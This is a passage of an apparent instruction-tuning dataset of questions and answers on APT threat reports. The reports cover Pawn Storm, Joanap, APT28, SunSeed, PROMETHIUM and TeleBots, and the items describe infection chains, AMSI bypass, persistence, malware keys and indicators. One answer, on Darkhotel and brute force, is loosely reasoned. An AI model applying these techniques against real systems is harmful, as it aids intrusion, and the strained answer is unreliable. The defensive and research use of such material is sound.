recently become widely spread such as ROP (return oriented programming).\nRead the text above and answer this question: How does the Metasploit Framework's implementation of the .LNK PoC exploit enable remote attacks, and what role does the WebDAV service play in this process?",
    "output": "The Metasploit Framework's implementation of the .LNK PoC exploit enables remote attacks by using the UNC path to the WebDAV service. This exploit involves a WebDAV service that can execute an arbitrary payload when accessed as a UNC path. The .LNK file contains the network path to the module with the payload. When a user follows the link generated by Metasploit, which displays the directory containing the .LNK file and DLL module with the payload, the payload is executed. This vulnerability remains functional and demonstrates that the .LNK file vulnerability can indeed be exploited remotely.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Update on Pawn Storm: New Targets and Politically Motivated Campaigns\nFeike Hacquebord (Senior Threat\nResearcher)\nJanuary 12, 2018\nPawn Storm has been attacking political organizations in France, Germany, Montenegro, Turkey, Ukraine, and the United States since 2015. We saw attacks against political organizations again in the second half of 2017. These attacks don't show much technical innovation over time, but they are well prepared, persistent, and often hard to defend against. Pawn Storm has a large toolset full of social engineering tricks, malware and exploits, and therefore doesn't need much (<http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-ramps-up-spear-phishing-before-zero-days-get-patched/>)innovation apart from occasionally using their own zero-days and quickly\nIn summer and fall of 2017, we observed Pawn Storm targeting several organizations with credential phishing and spear phishing attacks. Pawn Storm's modus operandi is quite consistent over the years, with some of their technical tricks being used repeatedly. For example, was used against Yahoo! users in August and September 2017 in US politically themed email. The method, which we first discussed in 2014, involves changing a browser tab to point to a phishing site after distracting the target.\nWe can often closely relate current and old Pawn Storm campaigns using data that spans more than four years, possibly because the actors in the group follow a script when setting up an attack. This makes sense, as the sheer volume of their attacks requires careful administration, planning, and organization to succeed. The screenshots below show two typical credential phishing emails that targeted specific organizations in October and November 2017. One type of email is supposedly a message from the target's Microsoft Exchange server about an expired password. The other says there is a new file on the company's OneDrive system.\nWhile these emails might not seem to be advanced in nature, we've seen that credential loss is often the starting point of further attacks that include stealing sensitive data from email inboxes. We have worked with one of the targets, an NGO in the Netherlands targeted twice, in late October and early November 2017. We successfully prevented both attacks from causing any harm. In one case we were able to warn the target within two hours after a dedicated credential phishing site was set up. In an earlier attack, we were able to warn the organization 24 hours before the actual phishing emails were sent.\n\nQ: How does Pawn Storm leverage credential phishing emails to initiate further attacks? What are the potential consequences of successful credential theft in these campaigns?",
    "output": "A: Pawn Storm leverages credential phishing emails to trick targets into revealing their login credentials. These emails often appear to come from legitimate sources, such as a target's Microsoft Exchange server or OneDrive system, claiming issues like expired passwords or new files available. While these emails might not seem advanced, they are effective in initiating further attacks. Successful credential theft can lead to the compromise of sensitive data from email inboxes, which can be used for additional attacks or data exfiltration. For instance, in the case of an NGO in the Netherlands targeted by Pawn Storm, credential phishing was the starting point for potential further intrusions, highlighting the significant risks associated with successful credential theft.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: JOANAP.B DOWNLOADED BACKDOOR, SEP 2009\nHowever, spreading is not the main payload of the B version of Joanap. Instead, it attempts to download and install a second stage malware. This malware, with the sha256 hash of c6d96be46ce3d616e0cb36d53c4fade7e954e74bfd2e34f9f15c4df58fc732d2, was hosted on the URL hxxp://www.booklist.co.kr/upload/img/200810/25.gif.  It would be downloaded and saved to disk under the name sysfault.exe and executed.\nThis malware is an installer, installing a service dll in the system folder under the name \"sdnssec.dll\". This is a listen-only backdoor, establishing a listening socket on port 136.\nSimilar to the Joanap.A variant and other KorDllbot-related backdoors, this supports a number of integer commands. The binary contains quite a lot of debug messages helpfully explaining the functionality of these.\nBig Headline: JOANAP.D BACKDOOR, JUL 2011\nThis malware arrives as a service installer which extracts and installs a DLL named scardprv.dll from its resource section, and writes hardcoded configuration data to a config file named mssscardprv.ax. It also attempts to delete files installed by previous Joanap versions.\nThe dropped service DLL has similarities with KorDllbots. It establishes a listening socket on a semi-random port which is either located between 1024 and 2048; or selected from a list of hardcoded port options. It also attempts to connect to C&C servers which are defined in the saved mssscardprv.ax file as raw IP address/port combinations.\nAll network traffic is encrypted using RC4 with the binary key (0x10,0x20,0x30,0x40,0x50,0x60,0x70,0x80,0x90,0x11,0x12,0x13,0x1A,0xFF,0xEE,0x48), and the backdoor accepts integer commands in the range 0x4001-0x4015.\nAPI strings reside in data blocks encrypted using AES. Network API's are encrypted with the key \"b n4rbhriq890v9=023=01*&(T-0Q325J1N;LK'\", while all others are encrypted with the key \"Bb102@jH4$t3hg%6&G1s*2J3gCNwVr*UeI!Dr3hytg^CHGf%ion\". This particular AES key was also found in both Joanap and KorDllbot malware belonging to the previously mentioned MicrosoftCodeSigningPCA certificate cluster.\nIn addition, this variant includes the Rbot PLAIN_CRYPT decryption keys \"9025jhdho39ehe2\" and \"iamsorry!@1234567\" for one specific decryption scenario. So, even though it is somewhat different from previous variants, it contains enough technical indicators to link it to the Joanap family.\nThe samples we have seen do not appear to have network spreader capability, though they may have been dropped by other malware.\nAbove: Indicators in the binary\nBig Headline: JOANAP.E WORM, AUG-SEP 2011\nJoanap.E was the first variant of this family we tied to this threat complex, due to the fact that several samples are signed using the peculiar MicrosoftCodeSigningPCA certificate format.\nThis variant is again a worm \u2013 as mentioned before, the installer drops three files \u2013 one SMB spreading DLL (wmmvsvc.dll), one backdoor DLL (scardprv.dll) and one configuration file (mssscardprv.ax). The backdoor DLL and the configuration file fill the same role as in Joanap.D.\nThe network spreader module contains some code from the B variant, but a lot of functionality has been reworked. Similarly to B, it generates semi-random IP addresses and attempts to logon to the admin account of these machines using a password dictionary.  If it manages to do this, it creates a remote share named \"$adnim\" (no typo), copies the main installer (and the configuration file) over, and executes it. The authors have moved away from using PsExec for remote execution. Instead they add shares and execute the worm by creating remote service commands via the Service Control Manager.\nIf this is successful, the worm sends a status mail the same way as the B variant. Mail is this time FROM: redhat@gmail.com TO: Joana <misswang8107@gmail.com>.\nThis malware uses the same encryption keys as the B variant. This worm sets the mutex \"PlatFormSDK2.1\".\n\nWhat are the encryption mechanisms used in the JOANAP.D backdoor, and how do these mechanisms relate to other known malware families?",
    "output": "The JOANAP.D backdoor uses multiple encryption mechanisms. All network traffic is encrypted using RC4 with a binary key (0x10,0x20,0x30,0x40,0x50,0x60,0x70,0x80,0x90,0x11,0x12,0x13,0x1A,0xFF,0xEE,0x48). Additionally, API strings reside in data blocks encrypted using AES. Network APIs are encrypted with the key 'b n4rbhriq890v9=023=01*&(T-0Q325J1N;LK', while all other APIs are encrypted with the key 'Bb102@jH4$t3hg%6&G1s*2J3gCNwVr*UeI!Dr3hytg^CHGf%ion'. This particular AES key was also found in both Joanap and KorDllbot malware belonging to the MicrosoftCodeSigningPCA certificate cluster. Furthermore, this variant includes the Rbot PLAIN_CRYPT decryption keys '9025jhdho39ehe2' and 'iamsorry!@1234567' for one specific decryption scenario, indicating a link to the Joanap family.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: APT28 Targeting a Journalist Covering the Caucasus\nAnother one of APT28's lures appeared to target a specific journalist covering issues in the Caucasus region. In late 2013, APT28 used a lure that contained a letter addressing a journalist by his first name and claiming to originate from a \"Chief Coordinator\" in Reason Magazine's \"Caucasian Issues Department\" - a division that does not appear to exist.6 (Reason Magazine is a US-based magazine) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine. In the background, the decoy document installed a SOURFACE backdoor on the victim's system.\n5 \"The EU's Association Agreements with Georgia, the Republic of Moldova and Ukraine\". European Union Press Release Database. 23 June 2014.  Web. http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm\n6 We attempted to identify candidate journalists in the country. One of these was a Georgian national of Chechen descent, whose work appears to center on Chechen and human rights issues. Ultimately, however, we cannot confirm the identity of the target(s).\nTable 1: Examples of APT28 domains imitating organizations in the Caucasus\nThe body of the letter suggests that APT28 actors are able to read at least two languages \u2013 Russian and English.  The grammar of the letter also indicates that English is not the author's first language, despite it purportedly originating from a US-based magazine. This implies that Russian may be the APT28 author's preferred language.\nTargeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. Several other nation states are suspected of targeting journalists and dissidents to monitor their activity, including China and Iran.7,8 Journalists in the Caucasus working on Caucasus independence issues would be a prime target for intelligence collection for Moscow. Journalists critical of the Kremlin have long been targets of surveillance and harassment, and a number of governments and human rights organizations have publicly criticized the government for its treatment of journalists and its increasing consolidation of control over the media.9\nSmall Headline: APT28's Other Targets in the Caucasus\nWe have seen APT28 register at least two domains mimicking the domains of legitimate organizations in the Caucasus, as shown in the table below. One APT28 domain imitated a key Chechen-focused news website, while the other appeared to target members of the Armenian military by hosting a fake login page.\nOf particular note, the Kavkaz Center is a Chechen-run website designed to present an alternative view to the long-running conflict between Russia and Chechen separatists. In 200410  and 2013,11  Russia's Foreign Minister voiced his displeasure that a Swedish company continues to host the Kavkaz Center website.\n7 Moran, Ned, Villeneuve, Nart, Haq, Thofique, and Scott, Mike. \"Operation Saffron Rose\". FireEye. 13 May 2014. Web. http://www.fireeye.com/blog/technical/ malware-research/2014/05/operation-saffron-rose.html\n8 The New York Times publicly disclosed their breach by APT12, which they assess was motivated by the China-based actors' need to know what the newspaper was publishing about a controversial topic related to corruption and the Chinese Communist Party's leadership.\n9 \"Russia\". Freedom House Press Release. 2013. Web. http://www.freedomhouse.org/report/freedom-press/2013/russia#.VD8fe9R4rew\n10\"Chechen website promotes terror: Lavrov\". UPI. 16 November 2014. Web. http://www.upi.com/Top_News/2004/11/16/Chechen-website-promotes-terror-Lavrov/UPI-11601100627922/\n11\"Lavrov urges Sweden to ban Chechen website server\" The Voice of Russia. 15 May 2013. Web. http://voiceofrussia.com/news/2013_05_15/Lavrov-urges-Sweden-to-ban-Chechen-website-server/\nBig Headline: EASTERN EUROPEAN GOVERNMENTS AND MILITARIES\nEastern European countries' political and military postures are traditionally core Russian government interests. The Kremlin has long regarded the former Soviet Republics and satellite states as in its sphere of economic, political, and military interest. Over the past two decades, as many of these states joined NATO and the EU, Russia has attempted to regain its influence in the region. Many of APT28's targets parallel this continued focus on Eastern European governments and militaries.\nMedium Headline: APT28 Targets Eastern European Government Organizations\nWe have evidence that APT28 made at least two attempts to compromise Eastern European government organizations:\n\u2022 In a late 2013 incident, a FireEye device deployed at an Eastern European Ministry of Foreign Affairs detected APT28 malware in the client's network.\n\u2022 More recently, in August 2014 APT28 used a lure (Figure 3) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine in a probable attempt to compromise the Polish government.  A SOURFACE sample employed in the same Malaysia Airlines lure was referenced by a Polish computer security company in a blog post.12 The Polish security company indicated that the sample was \"sent to the government,\" presumably the Polish government, given the company's location and visibility.\n12 \"MHT, MS12-27 Oraz *malware*.info\" Malware@Prevenity. 11 August 2014. Web. http://malware.prevenity.com/2014/08/malware-info.html\nTable 2:  Examples of APT28 domains imitating legitimate Eastern European organization names\nMedium Headline: We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations.\nAPT28 has registered domains similar to those of legitimate Eastern European news sites and governments, listed in Table 2.  These domain registrations not only suggest that APT28 is interested in Eastern European political affairs, but also that the group targets Eastern European governments directly.\nIn addition, APT28 used one domain for command and control sessions (baltichost[.]org) that was themed after the Baltic Host exercises. Baltic Host is a multinational logistics planning exercise, hosted annually since 2009 by one of the three Baltic States (Estonia, Latvia, and Lithuania, all three of which are on Russia's border) on a rotational basis. In June 2014, this event was integrated with a larger U.S. Army training event, and focused on exercises to improve interoperability with regional allies and partners.13, 14\nThis domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters. Such targets would potentially provide APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships. These exercises are a particular point of interest in Moscow: pro-Kremlin press cited Russia's interpretation of these military exercises and NATO's involvement as a \"sign of aggression,\" and Russia's Foreign Minister publicly stated that the exercise was \"a demonstration of hostile intention.\"15\n13 \"Saber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia'. Estonian Defense Forces. 9 June 2014. Web. 11 June 2014. http://www.mil.ee/en/ news/8251/saber-strike-and-baltic-host-kick-off-in-latvia,-lithuania-and-estonia\n14 \"Baltic Host 2014 rendering host nation support for the training audience of Exercise Saber Strike 2014 and repelling faked cyber-attacks\". Republic of Lithuania Ministry of National Defense. 12 June 2014. Web. http://www.kam.lt/en/news_1098/current_issues/baltic_host_2014_rendering_host_nation_ support_for_the_training_audience_of_exercise_saber_strike_2014_and_repelling_faked_cyber-attacks.html\n15 \"Tanks, troops, jets: NATO countries launch full-scale war games in Baltic\". Russia Today. 9 June 2014. Web. http://rt.com/news/164772-saber-strike-exercise-nato/\n\nHow did APT28 utilize domain registrations to target Eastern European governments and military exercises? What specific domain was used and what was its significance?",
    "output": "APT28 registered domains similar to those of legitimate Eastern European news sites and governments, suggesting a keen interest in Eastern European political affairs and direct targeting of these governments. One notable example is the domain baltichost[.]org, which was themed after the Baltic Host exercises. Baltic Host is a multinational logistics planning exercise hosted annually by one of the three Baltic States (Estonia, Latvia, and Lithuania) on a rotational basis. In June 2014, this event was integrated with a larger U.S. Army training event. This domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters, potentially providing APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Key Takeaways\nProofpoint has identified a likely nation-state sponsored phishing campaign using a possibly compromised Ukrainian armed service member's email account to target European government personnel involved in managing the logistics of refugees fleeing Ukraine.\nThe email included a malicious macro attachment which attempted to download a Lua-based malware dubbed SunSeed.\nThe infection chain used in this campaign bears significant similarities to a historic campaign Proofpoint observed in July 2021, making it likely the same threat actor is behind both clusters of activity.\nProofpoint is releasing this report in an effort to balance accuracy with responsibility to disclose actionable intelligence during a time of high-tempo conflict.\nBig Headline: Delivery\nOn February 24, 2022, Proofpoint detected an email originating from a ukr[.]net email address which was sent to a European government entity. The email utilized the subject \"IN ACCORDANCE WITH THE DECISION OF THE EMERGENCY MEETING OF THE SECURITY COUNCIL OF UKRAINE DATED 24.02.2022\" and included a macro enabled XLS file titled \"list of persons.xlsx,\" which was later determined to deliver SunSeed malware. The social engineering lure utilized in this phishing campaign were very timely, following a NATO Security Council meeting on February 23, 2022 and a news story about a Russian government \"kill list\" targeting Ukrainians that began circulating in Western media outlets on February 21, 2022. The format of the subject included the date \"24.02.2022\" at the end of subject line and was superficially similar to emails reported by the State Service of Special Communications and Information Protection of Ukraine (SSSCIP) on February 25, 2022. This alert indicated that mass phishing campaigns were targeting \"Citizens' e-mail addresses\" in Ukraine. The timing of the Proofpoint observed campaign is notable as it occurred within close proximity to the campaigns reported by Ukrainian state agencies.\nOpen-source research on the sender email address identified the account on a Ukrainian public procurement document for a Stihl lawn mower in 2016. The email account was listed as the contact address on the purchase, while the customer was listed as \"\u0412\u0456\u0439\u0441\u044c\u043a\u043e\u0432\u0430 \u0447\u0430\u0441\u0442\u0438\u043d\u0430 \u04102622\" or military unit A2622. This title, as well as the address listed, appear to refer to a military barracks that houses a military unit in \"\u0427\u0435\u0440\u043d\u0456\u0433\u0456\u0432\u0441\u044c\u043a\u0430 \u043e\u0431\u043b\u0430\u0441\u0442\u044c\" or the Chernihiv region of Ukraine. While Proofpoint has not definitively determined that this detected campaign is aligned with the phishing campaigns reported by the Ukrainian government or that this activity can be attributed to TA445, researchers assess that this may represent a continuation of the campaigns that utilize compromised Ukrainian personal accounts of armed service members to target the governments of NATO members in Europe.\nBig Headline: Macro Enabled Attachments\nThe malicious XLS attachment observed in the email was laden with a simple but distinct macro. When enabled, it executes a VB macro named \"Module1\" which creates a Windows Installer (msiexec.exe) object invoking Windows Installer to call out to an actor-controlled staging IP and download a malicious MSI package. It also sets a Microsoft document  equal to \"2\" which specifies a user interface level of \"completely silent installation.\" This hides all macro actions and network connections from the user. The actor accesses the delivery IP via the Microsoft Installer  method which is intended\nto obtain an MSI install file from a URL, save it to a cached location, and finally begin installation of the MSI package. Since the actor is utilizing an MSI package as an installer for a Lua-based malware, this method is well suited to be deployed via a malicious macro-laden document delivered via phishing.\nBig Headline: SunSeed Lua Malware Installation\nAnalysis of the actor-controlled delivery infrastructure identified an MSI package which installed a series of Lua-based dependencies, executed a malicious Lua script that Proofpoint has dubbed SunSeed, and established persistence via an LNK file installed for autorun at Windows Startup. This file, named qwerty_setup.msi, was previously  publicly by\nsecurity researcher Colin Hardy in response to Proofpoint's initial  regarding this threat. The package installs 12 legitimate Lua dependencies, a Windows Lua interpreter, a malicious Lua script (SunSeed), and a Windows shortcut LNK file for persistence. Notably, the legitimate Windows Lua interpreter sppsvc.exe has been modified so it does not print any output to the Windows Console. This is likely an effort to conceal the malware installation from the infected user. All files, except for the LNK file, are installed to the folder C:\\ProgramData\\.security-soft\\. The LNK persistence script, which executes the SunSeed command \"print.lua\" via the Window Lua interpreter, is saved to the directory C:\\ProgramData\\.security-soft\\sppsvc.exe to be executed at startup. This executes the malicious SunSeed Lua script \"print.lua\" that attempts to retrieve additional malicious Lua code from the actor command and control (C2) server.\nMedium Headline: Malicious SunSeed Lua Script:\nprint.lua|\n7bf33b494c70bd0a0a865b5fbcee0c58fa9274b8741b03695b45998bcd459328\nProofpoint researchers observed several distinct and unusual aspects about the MSI package upon closer inspection. The actor utilized the Japanese Shift-JIS code base, resulting in a Japanese language installation message upon launching the MSI package. This may be a rudimentary false flag intended to conceal the spoken language of the threat actor. Additionally, examination of the cryptography calls made by the package during installation indicates that the MSI file appears to have been created using a dated version of WiX Toolset version 3.11.0.1528. This is an open-source software that allows users to \"build MSIs without requiring additional software on a build server\" from the command line. This version was last updated in 2017 with a more recent update being pushed in 2019 and an entirely new version of the toolset made available in May 2021.\nBig Headline: SunSeed Malware Capabilities: A Lua Downloader\nBased on decoding of the SunSeed print.lua malicious second stage payload script, it appears to be a simple downloader which obtains the C Drive partition serial number from the host, appends to a URL request via a Lua socket, consistently pings the C2 server for additional\nLua code, and executes the code upon receiving it within a response. At the time of analysis, Proofpoint did not receive additional Lua code from the C2 server. However, researchers believe that this is likely intended to deliver subsequent stage payloads to the infected host. Further attempts to decode the SunSeed Lua host included several notable strings that may suggest a possible response from the actor-controlled server. These strings do not appear to be part of the initial SunSeed script's functionality in the absence of a C2 server response. Observed string values include, but are not limited to:\n\"serial\"\n\"string\"\n\"luacom\"\n\"CreateObject\"\n\"Scripting.FileSystemObject\"\n\"Drives\"\n\"SerialNumber\"\n\"socket.http\"\n\"request\"\n\"http://84.32.188[.]96/\"\n\" socket\"\n\"sleep\"\nBig Headline: Command and Control\nThe SunSeed malware when executed issues GET requests over HTTP via port 80 using a Lua Socket. The requests are issued to the C2 server every three seconds anticipating a response. The malware specifies the user agent as \"LuaSocket 2.0.2\" and appends the infected target's C Drive partition serial number to the URI request. This is a unique decimal digit value assigned to a drive upon creation of the file system. It may be an attempt by actors to track infected victims on the backend per their unique serial number. Additionally, this may allow operators to be selective about which infections are issued a next stage payload response. Based on the observed strings in the Lua script, researchers speculate that the server response may include further malicious commands, or a Lua based installer code which is executed as a response to the SunSeed payload, depending on the received serial identification number.\nBig Headline: Victimology and Targeting\nWith the finite data set available to Proofpoint surrounding this campaign, limited conclusions can be drawn regarding targeting. The Proofpoint-observed email messages were limited to European governmental entities. The targeted individuals possessed a range of expertise and professional responsibilities. However, there was a clear preference for targeting individuals with responsibilities related to transportation, financial and budget allocation, administration, and population movement within Europe. This campaign may represent an attempt to gain intelligence regarding the logistics surrounding the movement of funds, supplies, and people within NATO member countries.\nQ: How did the macro-enabled attachment in the phishing email work to deliver the SunSeed malware, and what steps were taken to conceal its actions from the user?",
    "output": "The macro-enabled XLS attachment contained a VB macro named 'Module1' that, when enabled, created a Windows Installer (msiexec.exe) object. This object invoked Windows Installer to call out to an actor-controlled staging IP and download a malicious MSI package. The macro also set a Microsoft document property to '2,' specifying a completely silent installation, which hid all macro actions and network connections from the user. The actor accessed the delivery IP via the Microsoft Installer method to obtain an MSI install file from a URL, save it to a cached location, and begin the installation of the MSI package. This method was well-suited for deploying the Lua-based SunSeed malware via a malicious macro-laden document delivered through phishing.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What techniques are used by the loaders in the Operation Armor Piercer campaign to instrument the final malware payload on the endpoint?",
    "output": "The loaders in the Operation Armor Piercer campaign use several techniques to instrument the final malware payload on the endpoint. These include downloading the payload from a remote location and activating it using process hollowing into itself or a target process, or decoding an embedded payload and activating it using process hollowing. Additionally, some loaders disable AMSI scanning by patching the 'AmsiScanBuffer' API and set up persistence via registry for the next stage malware payload using the HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run keys.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nIn both attacks we can see that the attackers have done their reconnaissance properly and may have used an insider to get the details they needed to prepare their attacks. In the Bangladeshi case, for example, the malware samples are tuned to the environment and how the banking system operates, including the supported software, databases, and printer. In the Vietnamese case, the malware is also tuned to fit the environment. The attackers knew that the bank used Foxit and replaced it with a fake version. The attackers have a very good understanding of the SWIFT messaging system and how to manipulate the system to prevent the detection of their fraudulent attempts of transferring the money. The malware in each attack was compiled just before the attack happened.\nAlthough both attacks were discovered at some point during the attempts to transfer large amounts of money, the actors may well have executed a few test runs to check their operations before the real attacks.\nThe operation in Vietnam happened in December 2015 and was discovered after an investigation of the incident in February 2016 in Bangladesh. The Vietnamese attack was reported to the banking world in May 2016. Would logs still be available for an incident that happened about six months ago? Would the possible test runs be traceable? These are some of the many questions that arise. One lesson from both cases is that when a fraud alert is triggered by either an internal system or by transaction authorities, a thorough analysis\u2014 including an in-depth analysis of the malware\u2014of the tactics and procedures used by the attackers is needed. In this case, investigators can share indicators such as MD5 sums, but because the attackers have customized their malware, sharing would be of little value. On the other hand, sharing the methods used by the attackers, the inner working of the malware, and its manipulation of the systems should teach us where to look and adapt our defenses.\n\nHow did the attackers demonstrate their understanding of the SWIFT messaging system and the specific environments of the Bangladeshi and Vietnamese banks, and what does this imply about their reconnaissance efforts?",
    "output": "The attackers demonstrated a deep understanding of the SWIFT messaging system and the specific environments of the Bangladeshi and Vietnamese banks by tailoring their malware to fit the unique characteristics of each bank. In the Bangladeshi case, the malware was designed to work seamlessly with the bank's supported software, databases, and printers. In the Vietnamese case, the attackers knew that the bank used Foxit and replaced it with a fake version. This level of customization suggests that the attackers conducted thorough reconnaissance and possibly had insider knowledge. They understood how to manipulate the SWIFT system to prevent the detection of their fraudulent money transfers. Additionally, the malware in each attack was compiled just before the attack occurred, indicating meticulous planning and execution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Activity Group Profile: PROMETHIUM\nCampaign summary: PROMETHIUM is an activity group that has been active since at least 2012. In 2016, an attack campaign by this group was recorded in early May that made use of an exploit for (<https://helpx.adobe.com/security/products/flash-player/apsb16-15.html>)CVE-2016-4117, a vulnerability in Adobe Flash Player, which at the time was both unknown and unpatched. Adobe promptly and publicly acknowledged the zero-day vulnerability and pushed a security update.\nPROMETHIUM and NEODYMIUM both target individuals in a specific area of Europe.\nThe attack itself began with certain individuals receiving links in instant messenger clients. These links led to malicious documents that invoked exploit code and eventually executed a piece of malware called Truvasys on unsuspecting victims' computers.\nAdministrators and users wondering whether they were targeted by PROMETHIUM can scan their network by using the indicators listed in the appendix, by using Windows Defender to examine their logs for \"Truvasys,\" or by searching for PROMETHIUM in their (<https://blogs.windows.com/windowsexperience/2016/03/01/announcing-windows-defender-advanced-threat-protection/>)Windows Defender Advanced Threat Protection product console alerts.\nAttack details: Truvasys has been (<https://securelist.com/blog/research/76147/on-the-strongpity-waterhole-attacks-targeting-italian-and-belgian-encryption-users/>)previously documented by peer organizations in the security industry. The malware and its developers have been active for a few years and have conducted multiple attack campaigns by masquerading as common computer utilities such as WinUtils, TrueCrypt, WinRAR, and SanDisk. In each of the campaigns, the Truvasys malware was updated to include additional features, showing close collaboration between the activity groups behind the campaigns and the developers of the malware.\nTruvasys is a collection of modules written in the Delphi programming language, a variant of Pascal. It runs on 32-bit and 64-bit editions of multiple versions of Windows, including Windows Vista, Windows 7, Windows 8, and Windows 10, in both standard user and administrator modes. It includes a number of features designed to evade detection, including virtual environment detection and tampering with security software.\nTruvasys connects to a remote command and control (C&C) server to retrieve instructions from an attacker, who can use the malware to execute arbitrary functionality on the compromised computer.\nThis malware family has targeted individuals through the combined use of spear phishing and watering hole techniques for a number of years. In most cases, Truvasys is embedded with legitimate installers of applications, compromising individual computers by tricking users into running the installers. One campaign involved a fake Adobe Flash Player installer, with a social engineering lure in Turkish.\nFigure 1. In one campaign, Truvasys was distributed via social engineering lures in the Turkish language\nThe language used in this example is consistent with the geography of Truvasys victims, as observed over the years. Most Truvasys activities have been observed across western Europe with a large majority of computers using the Turkish locale setting, which suggests that most of them are Turkish citizens or expatriates.\nWhile studying Truvasys, Microsoft uncovered a previously undocumented piece of malware known as Myntor that is a completely separate malware family. Myntor is pushed onto victims' computers that are selected by an unknown logic devised by PROMETHIUM.\nAnswer this question: How did PROMETHIUM leverage the CVE-2016-4117 vulnerability in their attack campaign, and what steps can cybersecurity experts take to identify if their networks have been targeted by this group?",
    "output": "PROMETHIUM leveraged the CVE-2016-4117 vulnerability, a zero-day flaw in Adobe Flash Player, by sending links to malicious documents via instant messenger clients. These documents invoked exploit code that ultimately executed the Truvasys malware on victims' computers. To identify if their networks have been targeted by PROMETHIUM, cybersecurity experts can scan their networks using the indicators listed in the appendix, examine Windows Defender logs for 'Truvasys,' or search for PROMETHIUM in the Windows Defender Advanced Threat Protection product console alerts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Darkhotel APT's use of brute force tactics in its selective infector component relate to the concept of Brute Force: Password Guessing, and what implications does this have for the APT's overall attack strategy?",
    "output": "Brute Force: Password Guessing is a tactic used by adversaries to gain unauthorized access to accounts by systematically guessing passwords. In the context of the Darkhotel APT, the selective infector component uses brute force tactics to infect executable files on removable drives. Although this is not directly related to password guessing, it demonstrates the APT's willingness to use brute force methods to achieve its goals. Furthermore, the APT's use of weak server configurations and simple mistakes in its infrastructure suggests that it may be vulnerable to Brute Force: Password Guessing attacks itself. This highlights the importance of implementing robust password policies and security measures to prevent such attacks. Additionally, the APT's ability to launch cryptographical attacks and factor 512-bit RSA keys suggests a high level of sophistication, which could potentially be used to launch Brute Force: Password Guessing attacks against its targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Conclusions\nThe TeleBots group continues to evolve in order to conduct disruptive attacks against Ukraine. Instead of spearphishing emails with documents containing malicious macros, they used a more sophisticated scheme known as a supply-chain attack. Prior to the outbreak, the Telebots group targeted mainly the financial sector. The latest outbreak was directed against businesses in Ukraine, but they apparently underestimated the malware' spreading capabilities. That's why the malware went out of control.\nBig Headline: Indicators of Compromise (IoC)\nESET detection names:\nWin32/TeleBot trojan\nVBS/Agent.BB trojan\nVBS/Agent.BD trojan\nVBS/Agent.BE trojan\nWin32/PSW.Agent.ODE trojan\nWin64/PSW.Agent.K trojan\nPython/Filecoder.R trojan\nWin32/Filecoder.AESNI.C trojan\nWin32/Filecoder.NKH trojan\nWin32/Diskcoder.C trojan\nWin64/Riskware.Mimikatz application\nWin32/RiskWare.Mimikatz application\nC&C servers:\ntransfinance.com[.]ua (IP: 130.185.250.171) bankstat.kiev[.]ua (IP: 82.221.128.27) www.capital-investing.com[.]ua (IP: 82.221.131.52)\nLegitimate servers abused by malware authors:\napi.telegram.org (IP: 149.154.167.200, 149.154.167.197, 149.154.167.198, 149.154.167.199)\nVBS backdoor:\n1557E59985FAAB8EE3630641378D232541A8F6F9 31098779CE95235FED873FF32BB547FFF02AC2F5 CF7B558726527551CDD94D71F7F21E2757ECD109\nMimikatz:\n91D955D6AC6264FBD4324DB2202F68D097DEB241 DCF47141069AECF6291746D4CDF10A6482F2EE2B 4CEA7E552C82FA986A8D99F9DF0EA04802C5AB5D 4134AE8F447659B465B294C131842009173A786B 698474A332580464D04162E6A75B89DE030AA768 00141A5F0B269CE182B7C4AC06C10DEA93C91664 271023936A084F52FEC50130755A41CD17D6B3B1 D7FB7927E19E483CD0F58A8AD4277686B2669831 56C03D8E43F50568741704AEE482704A4F5005AD 38E2855E11E353CEDF9A8A4F2F2747F1C5C07FCF 4EAAC7CFBAADE00BB526E6B52C43A45AA13FD82B F4068E3528D7232CCC016975C89937B3C54AD0D1\nWin32/TeleBot:\nA4F2FF043693828A46321CCB11C5513F73444E34 5251EDD77D46511100FEF7EBAE10F633C1C5FC53\nWin32/PSW.Agent.ODE (CredRaptor):\n759DCDDDA26CF2CC61628611CF14CFABE4C27423 77C1C31AD4B9EBF5DB77CC8B9FE9782350294D70 EAEDC201D83328AF6A77AF3B1E7C4CAC65C05A88 EE275908790F63AFCD58E6963DC255A54FD7512A EE9DC32621F52EDC857394E4F509C7D2559DA26B FC68089D1A7DFB2EB4644576810068F7F451D5AA\nWin32/Filecoder.NKH:\n1C69F2F7DEE471B1369BF2036B94FDC8E4EDA03E\nPython/Filecoder.R:\nAF07AB5950D35424B1ECCC3DD0EEBC05AE7DDB5E\nWin32/Filecoder.AESNI.C:\nBDD2ECF290406B8A09EB01016C7658A283C407C3 9C694094BCBEB6E87CD8DD03B80B48AC1041ADC9 D2C8D76B1B97AE4CB57D0D8BE739586F82043DBD\nWin32/Diskcoder.C:\n34F917AABA5684FBE56D3C57D48EF2A1AA7CF06D\nPHP shell:\nD297281C2BF03CE2DE2359F0CE68F16317BF0A86\nAnswer this question: How did the TeleBots group's tactics 